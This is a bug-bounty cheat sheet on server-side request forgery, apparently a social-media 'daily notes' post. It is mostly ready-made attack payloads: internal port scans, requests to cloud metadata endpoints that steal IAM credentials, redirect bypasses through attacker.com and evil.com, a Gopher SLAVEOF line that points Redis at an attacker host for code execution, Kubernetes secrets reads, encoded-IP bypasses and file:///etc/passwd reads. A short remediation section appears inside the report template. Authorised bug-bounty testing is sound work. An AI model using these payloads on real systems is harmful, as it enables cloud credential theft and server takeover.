# SSRF — Server-Side Request Forgery

> **OWASP:** A10:2021 — Server-Side Request Forgery  
> **Severity:** High → Critical (AWS metadata = instant Critical)  
> **Bounty Range:** $500 – $50,000+ (cloud creds = max payout)

---

## What is SSRF?

SSRF tricks the server into making HTTP requests on your behalf — to internal services, cloud metadata, or any URL you control. You never touch the target directly. The server does it for you.

---

## 5 Attack Types

### 01 · Basic SSRF — Internal Port Scan
```
Inject internal IPs into url= parameters:

GET /fetch?url=http://127.0.0.1:22     → SSH banner
GET /fetch?url=http://127.0.0.1:3306   → MySQL banner
GET /fetch?url=http://127.0.0.1:6379   → Redis banner
GET /fetch?url=http://192.168.1.1:80   → internal router

Port list to scan: 22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017
```

### 02 · AWS Metadata Theft (Critical)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

Returns:
{
  "AccessKeyId": "ASIAXXX",
  "SecretAccessKey": "abc123...",
  "Token": "FQoGZXIvYXdz...",
  "Expiration": "2024-01-01T00:00:00Z"
}

Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
       Header required: Metadata: true

GCP:   http://metadata.google.internal/computeMetadata/v1/
       Header required: Metadata-Flavor: Google
```

### 03 · SSRF via URL Redirect Bypass
```
If server has allowlist but follows redirects:

1. Host redirect on attacker server:
   evil.com/r → 302 → http://169.254.169.254/

2. Use open redirect on trusted domain:
   target.com/redirect?url=http://169.254.169.254

3. Short URL bypass:
   bit.ly/xxxx → resolves to internal IP after allowlist check

4. DNS rebinding:
   attacker.com → resolves to 127.0.0.1 after TTL expires
```

### 04 · Blind SSRF — Out-of-Band
```
When you get no response — use DNS callbacks:

Tools:
- Burp Collaborator: https://YOUR-ID.burpcollaborator.net
- interactsh:        https://YOUR-ID.oast.pro
- requestbin:        https://requestbin.com

Inject in every url/fetch/import/webhook param:
GET /import?url=https://YOUR-ID.oast.pro

DNS ping back = confirmed SSRF even with no HTTP response
```

### 05 · SSRF → RCE via Internal Services
```bash
# Redis via Gopher (SLAVEOF for RCE)
url=gopher://127.0.0.1:6379/_SLAVEOF%20attacker.com%206379

# Memcached via Gopher
url=gopher://127.0.0.1:11211/_stats

# Elasticsearch (no auth by default on old versions)
url=http://127.0.0.1:9200/_cat/indices
url=http://127.0.0.1:9200/_all/_search

# Internal Kubernetes API
url=http://127.0.0.1:8443/api/v1/secrets
url=http://10.96.0.1/api/v1/namespaces/default/secrets
```

---

## Where to Hunt SSRF

| Feature | What to test |
|---------|-------------|
| Webhook URLs | Inject internal IPs |
| PDF generators | `<img src="http://169.254.169.254">` in HTML |
| Import from URL | url=, source=, feed= |
| Avatar/image fetch | profile_image=http://... |
| URL preview / unfurl | Share link features |
| SSO / OAuth callbacks | callback_url param |
| File download | path=, resource=, document= |

---

## Bypass Techniques

```python
# IP encoding bypasses
http://2130706433/          # Decimal for 127.0.0.1
http://0x7f000001/          # Hex for 127.0.0.1
http://0177.0.0.1/          # Octal for 127.0.0.1
http://[::1]/               # IPv6 localhost
http://[::]                 # IPv6 all interfaces

# Domain-based bypasses
http://localtest.me/        # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net/
http://127.0.0.1.nip.io/   # nip.io wildcard DNS

# Protocol smuggling
file:///etc/passwd          # Read local files
dict://127.0.0.1:6379/info  # Redis INFO command
gopher://127.0.0.1:6379/_* # Raw TCP via Gopher
```

---

## Checklist

```
☐  Search for url=, fetch=, src=, redirect=, img=, path=, resource= params
☐  Try http://127.0.0.1, http://localhost, http://0.0.0.0
☐  Test AWS metadata: http://169.254.169.254/latest/meta-data/
☐  Use Burp Collaborator for blind SSRF — look for DNS callbacks
☐  Try protocol smuggling: file://, gopher://, dict://, ftp://
☐  Check webhook URLs, import from URL, PDF generators, avatar fetch
☐  Try IP encoding bypasses if direct IPs are blocked
☐  Test internal ports: 6379 (Redis), 9200 (Elastic), 27017 (Mongo)
```

---

## Report Template

```
Title: SSRF in /api/fetch — AWS IAM Credentials Exposed

Severity: Critical (CVSS 9.8)

Endpoint: GET /api/fetch?url=

Steps to Reproduce:
1. Send: GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. Response contains role name
3. Send: GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE
4. Response contains AccessKeyId, SecretAccessKey, Token

Impact:
Full AWS account access — attacker can list S3 buckets,
access RDS databases, create IAM users, and pivot to full
cloud infrastructure takeover.

Remediation:
- Implement allowlist for permitted domains/IPs
- Block access to 169.254.169.254 at network level
- Disable metadata service or use IMDSv2 (requires PUT)
- Never follow redirects when fetching user-supplied URLs
```

---

## Tools

- **Burp Suite** — Collaborator for blind SSRF detection
- **interactsh** — `go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest`
- **SSRFmap** — `python3 ssrfmap.py -r req.txt -p url`
- **Gopherus** — Generate Gopher payloads for Redis/MySQL RCE

---

*Daily Bug Bounty notes — follow for more.*
